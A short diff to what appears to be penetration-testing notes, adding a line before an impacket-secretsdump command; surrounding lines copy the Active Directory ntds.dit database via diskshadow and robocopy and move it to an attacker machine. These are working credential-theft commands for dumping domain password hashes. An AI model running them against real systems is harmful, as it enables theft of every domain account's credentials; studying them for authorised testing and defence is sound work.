@@ -76,6 +76,8 @@ diskshadow /s diskshadow.txt
 robocopy /b E:\Windows\ntds . ntds.dit
 ```
 Transfer ntds.dit from the target to the attacker machine.
+
+Then run the following to dump hashes:
 ```
 impacket-secretsdump local -ntds ntds.dit -system system
 ```
